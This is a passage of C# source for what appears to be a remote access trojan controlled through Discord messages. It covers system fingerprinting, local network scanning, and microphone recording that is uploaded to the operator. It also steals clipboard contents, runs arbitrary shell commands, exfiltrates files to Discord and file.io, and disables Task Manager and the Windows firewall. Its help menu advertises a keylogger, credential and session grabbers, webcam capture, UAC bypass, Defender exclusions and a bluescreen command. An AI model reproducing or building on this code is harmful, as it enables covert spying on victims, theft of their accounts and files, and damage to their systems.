            using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
            {
                foreach (ManagementObject MO in MOS.Get())
                {
                    double Bytes = Convert.ToDouble(MO["TotalPhysicalMemory"]);
                    RamAmount = (int)(Bytes / 1048576);
                    break;
                }
            }
            return RamAmount;
        }
        catch
        {
            return -1;
        }
    }

    // Get HWID
    public static string GetHWID()
    {
        try
        {
            using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor"))
            {
                foreach (ManagementObject mObject in mSearcher.Get())
                {
                    return mObject["ProcessorId"].ToString();
                }
            }
            return "Unknown";
        }
        catch { return "Unknown"; }
    }

    // Get system version
    private static string GetWindowsVersionName()
    {
        using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher(@"root\CIMV2", " SELECT * FROM win32_operatingsystem"))
        {
            string sData = string.Empty;
            foreach (ManagementObject tObj in mSearcher.Get())
            {
                sData = Convert.ToString(tObj["Name"]);
            }
            try
            {
                sData = sData.Split(new char[] { '|' })[0];
                int iLen = sData.Split(new char[] { ' ' })[0].Length;
                sData = sData.Substring(iLen).TrimStart().TrimEnd();
            }
            catch { sData = "Unknown System"; }
            return sData;
        }
    }

    //is admin
    public static bool IsAdministrator()
    {
        using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
        {
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }

    // Get bit
    private static string getBitVersion()
    {
        if (Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0").GetValue("Identifier").ToString().Contains("x86"))
        {
            return "(32 Bit)";
        }
        else
        {
            return "(64 Bit)";
        }
    }

    // Get system version
    public static string GetSystemVersion()
    {
        return (GetWindowsVersionName() + Convert.ToChar(0x20) + getBitVersion());
    }

    // Get programs list
    public static string GetProgramsList()
    {
        List<string> programs = new List<string>();

        foreach (string program in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)))
        {
            programs.Add(new DirectoryInfo(program).Name);
        }
        foreach (string program in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles)))
        {
            programs.Add(new DirectoryInfo(program).Name);
        }

        return string.Join(", ", programs) + ".";

    }


    [DllImport("iphlpapi.dll", ExactSpelling = true)]
    public static extern int SendARP(int destIp, int srcIp, byte[] macAddr, ref uint macAddrLen);

    public static IPAddress GetDefaultGateway()
    {
        return NetworkInterface
            .GetAllNetworkInterfaces()
            .Where(n => n.OperationalStatus == OperationalStatus.Up)
            .Where(n => n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
            .SelectMany(n => n.GetIPProperties()?.GatewayAddresses)
            .Select(g => g?.Address)
            .Where(a => a != null)
            .FirstOrDefault();
    }
    public static async Task NetDiscover(ulong replyChannelId, int to)
    {
        await SendMessageAsync($"📡 Scanning local network. From 1 to {to} hosts.", replyChannelId);

        try
        {
            string gateway = GetDefaultGateway().ToString();
            byte[] macAddr = new byte[6];
            uint macAddrLen = (uint)macAddr.Length;
            string ip, host, mac;
            string[] s = gateway.Split('.');
            string target = s[0] + "." + s[1] + "." + s[2] + ".";

            for (int i = 1; i <= to; i++)
            {
                ip = target + i.ToString();
                Ping ping = new Ping();
                PingReply reply = ping.Send(ip, 10);

                if (reply.Status == IPStatus.Success)
                {
                    IPAddress addr = IPAddress.Parse(ip);
                    try
                    {
                        host = Dns.GetHostEntry(addr).HostName;
                    }
                    catch
                    {
                        host = "unknown";
                    }
                    if (SendARP(BitConverter.ToInt32(IPAddress.Parse(ip).GetAddressBytes(), 0), 0, macAddr, ref macAddrLen) != 0)
                    {
                        mac = "unknown";
                    }
                    else
                    {
                        string[] v = new string[(int)macAddrLen];
                        for (int j = 0; j < macAddrLen; j++)
                            v[j] = macAddr[j].ToString("x2");
                        mac = string.Join(":", v);
                    }
                }
            }
            await SendMessageAsync("✅ Scanning " + to + " hosts completed!", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync("❌ Error:" + ex.Message, replyChannelId);
        }
    }
    public static async Task SpeakText(ulong replyChannelId, string text)
    {
        try
        {
            await SendMessageAsync($"Speaking text: {text}", replyChannelId);
            SpeechSynthesizer synthesizer = new SpeechSynthesizer();
            synthesizer.Volume = 100;  // 0...100
            synthesizer.Rate = 0;     // -10...10
            synthesizer.Speak(text);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error speaking: {ex.Message}", replyChannelId);
        }
    }

    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")]
    public static extern IntPtr SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);
    private static async Task MinimizeAllWindowsAsync(ulong replyChannelId)
    {
        try
        {
            IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
            SendMessage(lHwnd, 0x111, (IntPtr)419, IntPtr.Zero);
            await SendMessageAsync("All Windows minimized", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }

    private static async Task MaximizeAllWindowsAsync(ulong replyChannelId)
    {
        try
        {
            IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
            SendMessage(lHwnd, 0x111, (IntPtr)416, IntPtr.Zero);
            await SendMessageAsync("All Windows maximized", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }
    private static async Task SendHelpMessage(ulong replyChannelId)
    {
        try
        {
            string helpText =
                "📥 download !file or folder path!: Download file from target\n" +
                "📥 io_download !file or folder path!: Download file from target From url\n" +
                "📥 chand_download !files or folder path!: Download chand file from target\n" +
                "📥 all_download: Download all file from current directory\n" +
                "❌ stop_download: cancel Download from current directory\n" +
                "📤 upload !upload attachment! !url! [name [optimal] ]: Upload file to target\n" +
                "📤 url_upload !file url! !directory! [file name for save [optional] ] : Upload file to target\n" +
                "📂 ls: Show files and folders\n" +
                "📂 dir [type - name - size]: Show files and folders with filter\n" +
                "📂 list: Show files and folders with size\n" +
                "📁 cd !directory!: Change directory\n" +
                "📂 explorer !folder path!: Open custom folder and show\n" +
                "📁 folder: Change to rat directory\n" +
                "📁 desktop: Change to desktop directory\n" +
                "📁 picturs: Change to pictures directory\n" +
                "📁 videos: Change to videos directory\n" +
                "💼 zip: !file or folder path! Copress to zip\n";

            string helpText2 =
                "🗑️ remove !file path!: Remove file or folder\n" +
                "📄 pwd: Print working directory\n" +
                "🚀 run !file name!: Run any file on the target\n" +
                "🚀 arun !file name!: Run any file on the target as admin\n" +
                "🚀 save !direct link!: Download and Run any file automaticn\n" +
                "🔄 pross: Show all running processes\n" +
                "🔄 my_pross: Info about RAT processes\n" +
                "🆕 new_pross !process name!: Run new process\n" +
                "🛑 kill_pross !process name!: Stop any process\n" +
                "🔍 find_pross !process name!: find location of process\n" +
                "✅ start_taskmanager: Fix Task Manager\n" +
                "🚫 stop_taskmanager: Stop and disable Task Manager\n" +
                "✅ unblock: Unblock all computer inputs\n" +
                "🚫 block: Block all computer inputs\n" +
                "✅ start_firewall: Start the Windows Firewall on the target computer\n" +
                "🚫 stop_firewall: Stop the Windows Firewall on the target computer\n";

            string helpText3 =
                "☢️ grabber: Download and run grabber automatic\n" +
                "☢️ startup_grabber: Download and run grabber And save to startup automatic\n" +
                "🔐 password: (only for grabber)\n" +
                "🎮 steam: Get target steam account\n" +
                "🤖 discord: (only for grabber)\n" +
                "🤖 telegram: Get target telegram sessions\n" +
                "🤖 Eita: Get target eitaa sessions\n" +
                "📸 shot !number!: Take a screenshot\n" +
                "📷 getwebcam: Find webcam connected\n" +
                "📸 webcam !camera name!: Get pic from Webcam\n" +
                "📸 mwebcam !camera name! !number!: Get multi pic from Webcam\n" +
                "🔊 volume !number!: Set sound volume\n" +
                "🔊 set_volume !number!: Set sound volume Locked\n" +
                "🔊 normal_volume : sound volume UnLocked\n" +
                "⏯️ play !sound url!: Play any sound in target system\n" +
                "⏹️ stop_play: Stop Play Sound\n" +
                "🗣️ say !text!: Text to sound and play in windows target\n" +
                "🗣️ talk !voice file in attachments!: play your voice \n" +
                "🎙️ mic !time to seconds!: Hack target microphone\n" +
                "🖋️ type !your text!: Write text with target keyboard\n" +
                "🖋️ key !key number!: Send Key\n" +
                "📝 start_keylogger: Run keylogger\n" +
                "📝 stop_keylogger: Stop keylogger and get file\n" +
                "📋 clipboard: Get the current text from the clipboard target\n" +
                "📋 set_clipboard !your text!: Set a new text to the clipboard target\n";

            string helpText4 =
                "💻 cmd !command!: Run a command in the terminal\n" +
                "💻 powershell !command!: Run a powershell command in the terminal\n" +
                "🌐 webview !url!: Open website in target browser\n" +
                "🌐 chrome_webview !url!: Open website in target Chrome browser\n" +
                "🌐 network: Scan target network\n" +
                "✅ set_admin !directory exe file!: Add Force Admin Run Application\n" +
                "❌ remove_admin !directory exe file!: Remove Force Admin Run Application\n" +
                "♻️ admin: Restart rat with administrator access\n" +
                "♻️ force_admin: Restart rat with administrator access in infinity \n" +
                "☠️ low_security: Stop Uac And Set nodefender and set app as admin !\n" +
                "❌ uac: Stop the Windows UAC\n" +
                "❌ bypass_uac: Stop the Windows UAC Without admin accsses but anti virus detect\n" +
                "🗑️ no_defender !folder path!: Add Folder to windows defender exclusions\n" +
                "❌ startup_remove !name!: Remove from startup\n" +
                "⏰ startup_list: Show installed startup app\n";

            string helpText5 =
                "🖼️ wallpaper !image_url! OR attachments: Set a new wallpaper\n" +
                "💬 box !text!: Show MessageBox with your text\n" +
                "🕶️ hide_taskbar: Hide Windows Taskbar\n" +
                "💡 show_taskbar: Show Windows Taskbar\n" +
                "💣 fbomb !patch!: Start folder Bomber\n" +
                "❌ stop_fbomb: Stop folder Bomber\n" +
                "✅ show_icon: Show Desktop Icon\n" +
                "❌ hide_icon: Hide Desktop Icon\n" +
                "📉 minimize: Minimize all window\n" +
                "📉 bomb_minimize: Minimize Bomber\n" +
                "❌ stop_minimize: Stop Minimize Bomber\n" +
                "📈 maximize: Maximize all window\n" +
                "☠️ bluescreen: FUCK OFF WINDOWS [WARNING !]\n" +
                "☠️ say_******: Deface [WARNING ! Makhsoos owner]\n" +
                "🖱️ random_mouse [time]: Change mouse location randomly\n" +
                "🖥️ help: Display this help message\n" +
                "🖥️ info: Show system info\n" +
                "🔄 restart: Restart target computer\n" +
                "⛔ shutdown: Shutdown target computer";

            // ترکیب تمامی بخش‌های متن
            string fullHelpMessage = helpText + helpText2 + helpText3 + helpText4 + helpText5;

            // ارسال پیام به صورت تقسیم‌شده (یک، دو یا چند پیام)
            await SendLongMessageAsync(fullHelpMessage, replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }

    private static async Task SendLongMessageAsync(string message, ulong channelId)
    {
        const int discordLimit = 2000;
        const int wrapperLength = 6; // برای سه بک‌تیک در ابتدا و انتها (``` و ```)
        int maxContentLength = discordLimit - wrapperLength;

        // اگر کل پیام در یک پیام قابل ارسال است
        if (message.Length <= maxContentLength)
        {
            await SendMessageAsync($"```{message}```", channelId);
            return;
        }

        // اگر کل پیام در دو پیام قابل ارسال باشد
        if (message.Length <= maxContentLength * 2)
        {
            // تقسیم پیام به دو بخش در نزدیک نیمه پیام (ترجیحاً در انتهای یک خط)
            int splitPos = message.LastIndexOf('\n', message.Length / 2);
            if (splitPos == -1 || splitPos > maxContentLength)
            {
                splitPos = maxContentLength;
            }
            string part1 = message.Substring(0, splitPos);
            string part2 = message.Substring(splitPos);
            await SendMessageAsync($"```{part1}```", channelId);
            await SendMessageAsync($"```{part2}```", channelId);
            return;
        }

        // در غیر اینصورت، تقسیم پیام به بخش‌های کوچک‌تر بر اساس خطوط
        List<string> segments = new List<string>();
        string[] lines = message.Split('\n');
        StringBuilder sb = new StringBuilder();

        foreach (var line in lines)
        {
            if (sb.Length + line.Length + 1 > maxContentLength)
            {
                segments.Add(sb.ToString());
                sb.Clear();
            }
            sb.AppendLine(line);
        }
        if (sb.Length > 0)
            segments.Add(sb.ToString());

        foreach (var segment in segments)
        {
            await SendMessageAsync($"```{segment}```", channelId);
        }
    }

    private static List<string> SplitTextIntoChunks(string text, int chunkSize)
    {
        List<string> chunks = new List<string>();
        int index = 0;

        while (index < text.Length)
        {
            int chunkLength = Math.Min(chunkSize, text.Length - index);
            string chunk = text.Substring(index, chunkLength);
            chunks.Add(chunk);
            index += chunkLength;
        }

        return chunks;
    }
    private static void RestartWindows()
    {
        Process.Start("shutdown", "/r /t 0");
    }

    private static void ShutdownWindows()
    {
        Process.Start("shutdown", "/s /t 0");
    }

    private static async Task ExecuteFileAsync(string filePath, ulong replyChannelId)
    {
        try
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = filePath;
            startInfo.UseShellExecute = true;

            Process process = new Process();
            process.StartInfo = startInfo;

            process.Start();

            await SendMessageAsync($"Running file: {filePath}", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }
    private static void BlockInput(bool block)
    {
        if (block)
        {
            BlockInputNativeMethods.BlockInput(true);
        }
        else
        {
            SendKeys.SendWait("%{F4}");
        }
    }

    private static async Task SetClipboardContent(string content, ulong replyChannelId)
    {
        try
        {
            Exception threadEx = null;
            Thread staThread = new Thread(() =>
            {
                try
                {
                    Clipboard.SetText(content);
                }
                catch (Exception ex)
                {
                    threadEx = ex;
                }
            });
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start();
            staThread.Join();

            if (threadEx != null)
            {
                await SendMessageAsync($"Error setting clipboard: {threadEx.Message}", replyChannelId);
            }
            else
            {
                await SendMessageAsync($"Clipboard set to: {content}", replyChannelId);
            }
        }
        catch
        {
            await SendMessageAsync("Error setting clipboard!", replyChannelId);
        }
    }

    private static async Task SendClipboardContents(ulong replyChannelId)
    {
        string data = null;
        try
        {
            Exception threadEx = null;
            Thread staThread = new Thread(
                delegate ()
                {
                    try
                    {
                        data = Clipboard.GetText();
                    }
                    catch (Exception ex)
                    {
                        threadEx = ex;
                    }
                });
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start();
            staThread.Join();
        }
        catch
        {
            await SendMessageAsync("Error getting clipboard!", replyChannelId);
            return;
        }
        if (data == null) { await SendMessageAsync("Clipboard empty!", replyChannelId); return; }
        if (data.Length >= 1990)
        {
            await SendFileAsync(new MemoryStream(StringToBytes(data)), "output.txt", "Here's your file:", replyChannelId);
        }
        else
        {
            await SendMessageAsync($"{data}", replyChannelId);
        }
    }
    private static async Task StartFirewall(ulong replyChannelId)
    {
        try
        {
            Process.Start("netsh", "advfirewall set allprofiles state on");
            await SendMessageAsync("Firewall has been started", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error starting firewall: {ex.Message}", replyChannelId);
        }
    }

    private static async Task StopFirewall(ulong replyChannelId)
    {
        try
        {
            Process.Start("netsh", "advfirewall set allprofiles state off");
            await SendMessageAsync("Firewall has been stopped", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error stopping firewall: {ex.Message}", replyChannelId);
        }
    }

    private static async Task StartTaskManager(ulong replyChannelId)
    {
        try
        {
            EnableTaskManager();
            await SendMessageAsync("Task Manager started successfully.", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error starting Task Manager: {ex.Message}", replyChannelId);
        }
    }

    private static async Task StopTaskManager(ulong replyChannelId)
    {
        try
        {
            DisableTaskManager();
            await SendMessageAsync("Task Manager stopped successfully.", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error stopping Task Manager: {ex.Message}", replyChannelId);
        }
    }
    public static void DisableTaskManager()
    {
        ProcessStartInfo psi = new ProcessStartInfo("TASKKILL", "/F /IM Taskmgr.exe")
        {
            CreateNoWindow = true,
            UseShellExecute = false
        };

        Process.Start(psi);
        RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
        if (registryKey.GetValue("DisableTaskMgr") == null)
            registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
        registryKey.Close();
    }

    public static void EnableTaskManager()
    {
        RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
        if (registryKey.GetValue("DisableTaskMgr") != null)
            registryKey.DeleteValue("DisableTaskMgr");
        registryKey.Close();
    }
    public static async void PlayAudio(string audioUrl, ulong replyChannelId)
    {
        try
        {
            if (waveOutDevice != null)
            {
                waveOutDevice.Stop();
                waveOutDevice.Dispose();
            }
            waveOutDevice = new WaveOutEvent();
            audioFileReader = new AudioFileReader(audioUrl);
            waveOutDevice.Init(audioFileReader);
            waveOutDevice.Play();
            await SendMessageAsync("Audio playback has started successfully.", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error playing audio: {ex.Message}", replyChannelId);
        }
    }


    private static async Task SetVolume(string volumeValue, ulong replyChannelId)
    {
        try
        {
            float newVolume = float.Parse(volumeValue) / 100;
            MMDeviceEnumerator enumerator = new MMDeviceEnumerator();
            MMDevice defaultPlaybackDevice = enumerator.GetDefaultAudioEndpoint(DataFlow.Render, Role.Console);

            float oldVolume = defaultPlaybackDevice.AudioEndpointVolume.MasterVolumeLevelScalar;

            defaultPlaybackDevice.AudioEndpointVolume.MasterVolumeLevelScalar = newVolume;

            int oldVolumePercentage = (int)(oldVolume * 100);
            int newVolumePercentage = (int)(newVolume * 100);

            await SendMessageAsync($"Volume has been changed from {oldVolumePercentage}% to {newVolumePercentage}%", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error setting volume: {ex.Message}", replyChannelId);
        }
    }
    private static async Task RecordAndSendAudio(int durationInSeconds, ulong replyChannelId)
    {
        try
        {
            Process currentProcess = Process.GetCurrentProcess();
            string userName = Environment.UserName;
            string computerName = userName;
            string tempPath = Path.GetTempPath();
            string randomFileName = Path.GetRandomFileName();
            string outputWavFilePath = Path.Combine(tempPath, $"{computerName}_{randomFileName}.wav");
            string outputMp3FilePath = Path.Combine(tempPath, $"{computerName}_{randomFileName}.mp3");
            using (var audioRecorder = new WaveFileWriter(outputWavFilePath, new WaveFormat(16000, 16, 1)))
            {
                using (var audioCapture = new WaveInEvent())
                {
                    audioCapture.WaveFormat = new WaveFormat(16000, 16, 1);
                    audioCapture.DataAvailable += (sender, e) =>
                    {
                        audioRecorder.Write(e.Buffer, 0, e.BytesRecorded);
                    };
                    audioCapture.StartRecording();
                    await Task.Delay(TimeSpan.FromSeconds(durationInSeconds));
                    audioCapture.StopRecording();
                }
            }
            using (var reader = new WaveFileReader(outputWavFilePath))
            {
                MediaFoundationEncoder.EncodeToMp3(reader, outputMp3FilePath, 192000);
            }

            if (File.Exists(outputMp3FilePath))
            {
                using (var audioStream = File.OpenRead(outputMp3FilePath))
                {
                    await SendFileAsync(audioStream, "audio.mp3", "Here's the recorded audio:", replyChannelId);
                }
                File.Delete(outputWavFilePath);
                File.Delete(outputMp3FilePath);
            }
            else
            {
                await SendMessageAsync("Recording and conversion to MP3 failed.", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }
    public static async Task ExecuteUrlUploadCommand(string url, string directoryPath, string fileName, ulong replyChannelId)
    {
        try
        {
            if (string.IsNullOrWhiteSpace(url) || string.IsNullOrWhiteSpace(directoryPath))
            {
                await SendMessageAsync("Usage: url_upload \"url\" \"directoryPath\" [fileName]", replyChannelId);
                return;
            }

            if (!Directory.Exists(directoryPath))
            {
                await SendMessageAsync("Invalid directory path.", replyChannelId);
                return;
            }

            using (var httpClient = new HttpClient())
            {
                var fileBytes = await httpClient.GetByteArrayAsync(url);

                if (string.IsNullOrWhiteSpace(fileName))
                {
                    string[] urlParts = url.Split('/');
                    fileName = urlParts[urlParts.Length - 1];
                }
                string filePath = Path.Combine(directoryPath, fileName);
                File.WriteAllBytes(filePath, fileBytes);
                await SendMessageAsync($"File '{fileName}' uploaded to '{directoryPath}'", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }

    private static async Task ProcessIoDownloadCommand(string commandContent, ulong replyChannelId)
    {
        string[] commandParts = commandContent.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
        string command = commandParts[0];
        string filePath = string.Join(" ", commandParts.Skip(1));

        if (command.Equals("io_download", StringComparison.OrdinalIgnoreCase))
        {
            if (File.Exists(filePath))
            {
                string uploadResult = await UploadFileToFileIo(filePath);
                if (uploadResult.StartsWith("Error:"))
                {
                    await SendMessageAsync(uploadResult, replyChannelId);
                }
                else
                {
                    await SendMessageAsync($"File uploaded successfully. Download link: {uploadResult}", replyChannelId);
                }
            }
            else
            {
                await SendMessageAsync("Error: The specified file does not exist.", replyChannelId);
            }
        }
    }




    private static async Task<string> UploadFileToFileIo(string filePath)
    {
        using (var client = new HttpClient())
        {
            try
            {
                var content = new MultipartFormDataContent();
                var fileStream = File.OpenRead(filePath);
                content.Add(new StreamContent(fileStream), "file", Path.GetFileName(filePath));

                var response = await client.PostAsync("https://file.io/?expires=1w", content);

                if (response.IsSuccessStatusCode)
                {
                    var responseContent = await response.Content.ReadAsStringAsync();
                    var responseData = JsonSerializer.Deserialize<Dictionary<string, string>>(responseContent);

                    return responseData?["link"];
                }
                else
                {
                    return "Error: Unable to upload the file to file.io";
                }
            }
            catch (Exception ex)
            {
                return $"Error: {ex.Message}";
            }
        }
    }

    private static async Task ChandDownloadFiles(List<string> filePaths, ulong replyChannelId)
    {
        foreach (string filePath in filePaths)
        {
            try
            {
                if (File.Exists(filePath))
                {
                    await SendMessageAsync($"Downloading file: {Path.GetFileName(filePath)}...", replyChannelId);

                    using (var stream = File.OpenRead(filePath))
                    {
                        await SendFileAsync(stream, Path.GetFileName(filePath), $"File downloaded: {Path.GetFileName(filePath)}", replyChannelId);
                    }
                }
                else
                {
                    await SendMessageAsync($"File not found: {Path.GetFileName(filePath)}", replyChannelId);
                }
            }
            catch (Exception ex)
            {
                await SendMessageAsync($"Error uploading file: {ex.Message}", replyChannelId);
            }
        }
    }

    public static async Task downloadFile(string filePath, ulong replyChannelId)
    {
        try
        {
            if (File.Exists(filePath))
            {
                await SendMessageAsync($"Downloading file: {Path.GetFileName(filePath)}", replyChannelId);
                using (var stream = File.OpenRead(filePath))
                {
                    await SendFileAsync(stream, Path.GetFileName(filePath), $"File Downloaded: {Path.GetFileName(filePath)}", replyChannelId);
                }
            }
            else
            {
                await SendMessageAsync("File not found.", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error Downloading file: {ex.Message}", replyChannelId);
        }
    }
    private static async Task ExecuteTypeCommand(string typeCommand, ulong replyChannelId)
    {
        try
        {
            System.Windows.Forms.SendKeys.SendWait(typeCommand);
            await SendMessageAsync("Typed", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }
    private static async Task ExecuteRemoveCommand(string removeCommand, ulong replyChannelId)
    {
        try
        {
            Process currentProcess = Process.GetCurrentProcess();
            removeCommand = removeCommand.Trim('"');
            bool isFile = File.Exists(removeCommand);
            bool isDirectory = Directory.Exists(removeCommand);
            if (isFile)
            {
                File.Delete(removeCommand);
                await SendMessageAsync($"File '{removeCommand}' has been deleted.", replyChannelId);
            }
            else if (isDirectory)
            {
                Directory.Delete(removeCommand, true);
                await SendMessageAsync($"Directory '{removeCommand}' has been deleted.", replyChannelId);
            }
            else
            {
                await SendMessageAsync($"File or directory '{removeCommand}' not found.", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }
    private static async Task ListMyProcess(ulong replyChannelId)
    {
        try
        {
            Process currentProcess = Process.GetCurrentProcess();
            string userName = Environment.UserName;
            string accessType = IsUserAnAdmin() ? "Administrator" : "User";
            string processInfo = $"My Process Info:\nName: {currentProcess.ProcessName}\nID: {currentProcess.Id}\nAccess: {userName} ({accessType})\nStart Time: {currentProcess.StartTime}";

            await SendMessageAsync($"```\n{processInfo}```", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }

    private static bool IsUserAnAdmin()
    {
        using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
        {
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }

    private static async Task KillProcess(ulong replyChannelId, string processIdentifier)
    {
        try
        {
            if (int.TryParse(processIdentifier, out int processId))
            {
                try
                {
                    Process process = Process.GetProcessById(processId);
                    process.Kill();
                    await SendMessageAsync($"Process with ID {processId} has been terminated.", replyChannelId);

                }
                catch (ArgumentException)
                {

                    await SendMessageAsync($"No process found with ID {processId}.", replyChannelId);

                }
            }
            else
            {
                Process[] processes = Process.GetProcessesByName(processIdentifier);

                if (processes.Length == 0)
                {
                    await SendMessageAsync($"No processes found '{processIdentifier}'.", replyChannelId);

                    return;
                }

                foreach (Process process in processes)
                {
                    process.Kill();
                    await SendMessageAsync($"Process '{processIdentifier}' with ID {process.Id} has been terminated.", replyChannelId);

                }
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }
    private static async Task StartNewProcess(string command, ulong replyChannelId)
    {
        try
        {
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c {command}",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            process.StartInfo = startInfo;
            process.Start();

            string output = await process.StandardOutput.ReadToEndAsync();
            string error = await process.StandardError.ReadToEndAsync();
            process.WaitForExit();

            string resultMessage = "Process Started:\n\n";
            if (!string.IsNullOrWhiteSpace(output))
            {
                resultMessage += $"Standard Output:\n{output}\n";
            }
            if (!string.IsNullOrWhiteSpace(error))
            {
                resultMessage += $"Standard Error:\n{error}\n";
            }

            if (resultMessage.Length >= 1900)
            {
                byte[] resultMessageBytes = Encoding.UTF8.GetBytes(resultMessage);
                using (var resultMessageStream = new MemoryStream(resultMessageBytes))
                {
                    await SendFileAsync(resultMessageStream, "process_result.txt", "Here's the process result:", replyChannelId);
                }
            }
            else
            {
                await SendMessageAsync($"```\n{resultMessage}```", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }
    private static async Task ListProcesses(ulong replyChannelId)
    {
        try
        {
            Process[] processes = Process.GetProcesses();

            // لیست فرآیندهای سیستمی که باید فیلتر شوند
            string[] systemProcesses = { "svchost", "wudfhost", "wmiprvse", "taskhostw", "fontdrvhost", "csrss", "wininit", "winlogon", "smss", "services", "lsass", "dwm", "sihost", "spoolsv", "rdpclip", "shellExperienceHost", "startMenuExperienceHost", "conhost", "memory compression", "registry", "system", "idle" };

            // فیلتر کردن و مرتب‌سازی
            var filteredProcesses = processes
                .Where(p => !systemProcesses.Contains(p.ProcessName.ToLower())) // حذف فرآیندهای ناخواسته
                .GroupBy(p => p.ProcessName.ToLower()) // حذف تکراری‌ها بر اساس نام
                .Select(g => g.First()) // فقط اولین مورد از هر گروه انتخاب شود
                .OrderBy(p => p.ProcessName) // مرتب‌سازی الفبایی
                .ToList();

            string processList = "Processes:\n";

            foreach (Process process in filteredProcesses)
            {
                processList += $"{process.ProcessName} : {process.Id}\n";
            }

            if (processList.Length >= 1900)
            {
                byte[] processListBytes = Encoding.UTF8.GetBytes(processList);
                using (var processListStream = new MemoryStream(processListBytes))
                {
                    await SendFileAsync(processListStream, "process_list.txt", "Here's the list of active processes:", replyChannelId);
                }
            }
            else
            {
                await SendMessageAsync($"```\n{processList}```", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }


    private static async Task ListAllFilesAndFolders(ulong replyChannelId)
    {
        string data = String.Join("\n", Directory.GetFileSystemEntries(Directory.GetCurrentDirectory(), "*", SearchOption.TopDirectoryOnly));
        if (data.Length >= 1990)
        {
            using (var outputStream = new MemoryStream(Encoding.UTF8.GetBytes(data)))
            {
                await SendFileAsync(outputStream, "output.txt", "Here's the output:", replyChannelId);
            }
            File.Delete(data);

        }
        else
        {
            await SendMessageAsync("```" + data + "```", replyChannelId);
        }
    }
    private static async Task ListCurrentDirectoryContents(ulong replyChannelId)
    {
        string currentDirectory = Directory.GetCurrentDirectory();
        string[] entries = Directory.GetFileSystemEntries(currentDirectory, "*", SearchOption.TopDirectoryOnly);
        string content = $"{currentDirectory}\n\n";
        content += string.Join("\n", entries.Select(entry => Path.GetFileName(entry)));

        if (content.Length >= 1990)
        {
            byte[] contentBytes = Encoding.UTF8.GetBytes(content);
            using (var contentStream = new MemoryStream(contentBytes))
            {
                await SendFileAsync(contentStream, "directory_contents.txt", "Here's the directory contents:", replyChannelId);
            }
        }
        else
        {
            await SendMessageAsync($"```{content}```", replyChannelId);
        }
    }
    private static async Task ExecuteCdCommand(string cdCommand, ulong replyChannelId)
    {
        try
        {
            Process currentProcess = Process.GetCurrentProcess();

            if (cdCommand == "..")
            {
                string currentDirectory = Directory.GetCurrentDirectory();
                DirectoryInfo parentDirectory = Directory.GetParent(currentDirectory);

                if (parentDirectory != null)
                {
                    Directory.SetCurrentDirectory(parentDirectory.FullName);
                    await SendMessageAsync($"Changed to: {Directory.GetCurrentDirectory()}", replyChannelId);
                }
                else
                {
